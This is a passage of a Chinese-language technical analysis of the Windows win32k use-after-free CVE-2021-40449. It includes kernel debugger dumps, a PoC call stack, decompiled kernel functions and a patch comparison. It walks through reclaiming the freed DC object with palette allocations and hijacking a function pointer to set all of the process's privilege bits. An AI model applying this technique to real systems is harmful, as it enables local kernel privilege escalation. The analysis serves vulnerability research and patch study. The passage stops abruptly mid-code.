    1: kd> dq rdx
    DBGHELP: SharedUserData - virtual symbol module
    ffff885e`84121620  00000000`01211b60 80000001`00000000
    ......
    1: kd> dq rdx+0x30
    ffff885e`84121650  ffff885e`8006b030 00000000`00000000
    ......
    1: kd> dq ffff885e`8006b030
    ffff885e`8006b030  00000000`00000000 00000000`00000000
    ffff885e`8006b040  00000000`00000000 ffff885e`80063030
    ffff885e`8006b050  00000001`00000001 ffff885e`8006b030
    ffff885e`8006b060  00000000`00000000 00000000`00008180
    ffff885e`8006b070  ffffb48d`a317b8b0 00000000`00000000
    ffff885e`8006b080  00000000`00000000 00000000`00000000
    ffff885e`8006b090  00000000`00000000 00000000`00000000
    ffff885e`8006b0a0  00000000`00000000 00000000`00000000
在DeleteDCInternel调用之后第一个DC对象的内存空间已经被释放
    0: kd> !pool ffff885e`80063030
    // 注意，此时DC对象地址距离堆头地址为0x30大小
    Pool page ffff885e80063030 region is Paged session pool
    *ffff885e80063000 size:  e30 previous size:    0  (Free ) *GDev
            Pooltag GDev : Gdi pdev
     ffff885e80063e30 size:   70 previous size:  e30  (Free)       Free
     ffff885e80063ea0 size:   b0 previous size:   70  (Free )  Usqm
     ffff885e80063f50 size:   b0 previous size:   b0  (Allocated)  Usqm
根据调试，可以得知释放的DC对象内存大小为0xe30，所以要覆盖函数指针时，所申请的内存也要刚刚好或者接近这块内存大小才有可能申请到。在poc里面，使用CreatePalette申请这块内核堆。这个函数会通过系统调用进入内核函数win32kfull!NtGdiCreatePaletteInternal，该函数调用win32kbase!PALMEMOBJ::bCreatePalette创造Palette对象，win32kbase!PALMEMOBJ::bCreatePalette会调用AllocateObject为新对象申请空间，最终通过调用ExAllocatePoolWithTag函数分配堆空间，整个调用栈如下：
    0: kd> kb
     # RetAddr               :  Call Site
    00 ffff880c`b95d39f4     :  win32kbase!Win32AllocPool
    01 ffff880c`b95d0042     :  win32kbase!AllocateObject+0xc4
    02 ffff880c`b9309ecc     :  win32kbase!PALMEMOBJ::bCreatePalette+0xb2
    03 fffff800`b175a193     :  win32kfull!NtGdiCreatePaletteInternal+0xcc
    04 00007ffe`a2cb2604     :  nt!KiSystemServiceCopyEnd+0x13
    05 00007ff7`e44c2fe1     :  win32u!NtGdiCreatePaletteInternal+0x14
    06 00000000`00000d94     :  cve_2021_40449!createPaletteofSize1+0xd1 [C:\Users\mimi\source\repos\test\cve-2021-40449\main.cpp @ 71] 
    .......
    2e 00007ffe`a2e9b26f     :  0x000000d1`a374ef69
    2f 00007ffe`a39e1a4a     :  gdi32full!GdiPrinterThunk+0x21f
    30 00007ffe`a61889e4     :  USER32!__ClientPrinterThunk+0x3a
    31 00007ffe`a2cb6dc4     :  ntdll!KiUserCallbackDispatcherContinue
    32 00007ffe`a2e7edda     :  win32u!NtGdiResetDC+0x14
    33 00007ffe`a3682371     :  gdi32full!ResetDCWInternal+0x17a
    34 00007ff7`e44c3296     :  GDI32!ResetDCW+0x31
    35 00000000`00000000     :  cve_2021_40449!main+0x146 [C:\Users\mimi\source\repos\test\cve-2021-40449\main.cpp @ 685]
win32kbase!Win32AllocPool代码如下，最终是通过调用`ExAllocatePoolWithTag`申请堆，win32kbase!Win32AllocPool的a1参数为要申请的堆内存大小，调试过程中可以得知其要申请0xe20大小的堆，加上堆头，刚好接近刚释放的0xe3大小的堆空间大小。
    __int64 __fastcall Win32AllocPool(__int64 a1, unsigned int a2)
    {
      unsigned int v2; // ebx
      __int64 v3; // rdi
      __int64 result; // rax
      v2 = a2;
      v3 = a1;
      if ( (signed int)IsWin32AllocPoolImplSupported_0() 
里面的注释。
通过函数指针调用RtlSetAllBits函数并传入RtklBitMap型指针，其中RtlBitMap的buffer指向POC进程自身的权限位，如下图：
    typedef struct _RTL_BITMAP {
        ULONG  SizeOfBitMap;
        ULONG *Buffer;
    } RTL_BITMAP, *PRTL_BITMAP;
    0: kd> dq ffff885e80063000+0x750                        // 此处为RtlBitMap地址
    ffff885e`80063750  ffffb48d`a3839010 ffffffff`ffffffff
    ffff885e`80063760  ffffffff`ffffffff ffffffff`ffffffff
    ffff885e`80063770  ffffffff`ffffffff ffffffff`ffffffff
    ffff885e`80063780  ffffffff`ffffffff ffffffff`ffffffff
    ffff885e`80063790  ffffffff`ffffffff ffffffff`ffffffff
    ffff885e`800637a0  ffffffff`ffffffff ffffffff`ffffffff
    ffff885e`800637b0  ffffffff`ffffffff ffffffff`ffffffff
    ffff885e`800637c0  ffffffff`ffffffff ffffffff`ffffffff
    0: kd> dq ffffb48d`a3839010                             // 此处存放了RtlBitMap结构，0x00-0x08为size，0x08-0x10为buffer指针，指向了自身的权限位
    ffffb48d`a3839010  00000000`00000080 ffffde8f`1fb2e9d0
    ffffb48d`a3839020  41414141`41414141 41414141`41414141
    ffffb48d`a3839030  00000000`00000000 00000000`00000000
    ffffb48d`a3839040  00000000`00000000 00000000`00000000
    ffffb48d`a3839050  00000000`00000000 00000000`00000000
    ffffb48d`a3839060  00000000`00000000 00000000`00000000
    ffffb48d`a3839070  00000000`00000000 00000000`00000000
    ffffb48d`a3839080  00000000`00000000 00000000`00000000
    0: kd> dq ffffde8f`1fb2e9d0
    ffffde8f`1fb2e9d0  00000006`02880000 00000000`00800000
    ffffde8f`1fb2e9e0  00000000`00800000 00000000`00000000
    ffffde8f`1fb2e9f0  00000000`00000000 00000000`00000000
    ffffde8f`1fb2ea00  20010000`00000000 0000000f`00000001
    ffffde8f`1fb2ea10  000001e0`00000000 00000000`00001000
    ffffde8f`1fb2ea20  00000000`00000000 ffffde8f`1fb2ee18
    ffffde8f`1fb2ea30  00000000`00000000 ffffde8f`1f1007f0
    ffffde8f`1fb2ea40  ffffde8f`1f1007f0 ffffde8f`1f10080c
调用DC里面的函数指针之前，自身权限位为正常权限。
调用函数指针之后，可以看到权限位全部置为了1
#### 补丁分析
在 **漏洞利用分析**
里面分析过漏洞形成原因是因为在调用GreResetDCInternal函数时，使用DC对象指针的时候没有检查DC对象是否异常。而利用该漏洞是通过在调用回调函数时调用ResetDC实现的。
我们再次回顾一下漏洞函数，在调用hdcOpenDCW也就是在调用回调函数之前会通过DCO的构造函数从DC构造DCO对象，在基本概念中知道，内核对象每被引用一次则对象引用计数器值会加一。调用构造函数时，DC对象引用加一，正常情况下此时DC对象引用次数要为1。如果在回调函数中再次调用ResetDC，则会第二次调用GreResetDCInternal，再次调用DCO的构造函数，DC对象引用再次加一，此时引用次数为2。
所以判断DC对象异常可以通过判断DC对象的引用次数实现。
    __int64 __usercall GreResetDCInternal@(HDC a1@, __int64 a2@, int *a3@)
    {
      __int64 v24; // [rsp+50h] [rbp-20h]
      __int64 v25; // [rsp+60h] [rbp-10h]
      DCOBJ::DCOBJ((DCOBJ *)&v25, a1);              // 利用构造函数从HDC创建DCOBJ对象
      v8 = v25;
            ··········
      v10 = *(_QWORD *)(v8 + 48);                   // 赋值
      *(_QWORD *)(v10 + 1736) = 0i64;
      v24 = v11;
            ·······
      v9 = *(_QWORD *)(v25 + 512) != 0i64;
      v12 = *(_DWORD *)(v25 + 120) > 0;
            ·······
          v13 = (HDC)hdcOpenDCW(&qword_1C0141EB0, v26, 0i64, 0i64, *(_QWORD *)(v10 + 2584));// 创建新的DC对象，返回对应的HDC句柄
          if ( v13 )
          {
            *(_QWORD *)(v10 + 2584) = 0i64;
            DCOBJ::DCOBJ((DCOBJ *)&v24, v13);
            v14 = (_QWORD *)v24;
            if ( v24 )
            {
              if ( v12 )
                *(_DWORD *)(v24 + 120) = *(_DWORD *)(v24 + 116);
              v14[308] = *(_QWORD *)(v25 + 2464);
              *(_QWORD *)(v25 + 2464) = 0i64;
              v14[309] = *(_QWORD *)(v25 + 2472);
              *(_QWORD *)(v25 + 2472) = 0i64;
              v15 = *(void (__fastcall **)(_QWORD, _QWORD))(v10 + 2768);
              if ( v15 )
                v15(*(_QWORD *)(v10 + 1824), *(_QWORD *)(v14[6] + 1824i64));// 调用函数指针指向的函数，传入参数为用户传入的HDC对应的DC对象内的值
                ·······
              HmgSwapLockedHandleContents(v3, 0i64, v6, 0i64, v23);// 交换旧的和新的HDC对象
              GreReleaseHmgrSemaphore();
                ······
        bDeleteDCInternal(v6, 1i64, 0i64);  // 删除了hdcOpenDCW分配的HDC，但前面经过HmgSwapLockedHandleContents交换了句柄，实际删除的是旧的HDC
                ······
在补丁中，增加了对DC对象引用次数进行判断的逻辑，如果在GreResetDCInternal函数中DC对象引用次数大于1则表明已经发生异常，进入异常逻辑抛出错误(因为按正常流程此处DC对象引用次数应为不应该大于1)。
    __int64 __fastcall sub_1C014CB0C(__int64 a1, __int64 a2, int *a3)
    {
    ......
      int *v30; // [rsp+30h] [rbp-1h]
     .....
      v9 = (__int64)v30;
      if ( !v30 )
      {
    LABEL_6:
        EngSetLastError(6i64);
    LABEL_7:
        v13 = (__int64)v30;
        goto LABEL_8;
      }
      if ( *((_WORD *)v30 + 6) > 1u )
      {
        if ( *(_DWORD *)&stru_1C032C3F8.Length > 5u && (unsigned __int8)sub_1C00B5068(&stru_1C032C3F8, 0x400000000000i64) )
        {
          v31 = &v25;
          v30 = &v26;
          v29 = &v28;
          v28 = 0x1000000i64;
          SysEntryGetDispatchTableValues(v10, (__int64)&unk_1C02F466B, v11, v12);
        }
        goto LABEL_6;
      }
参考链接：
> 
>
> 
>
> [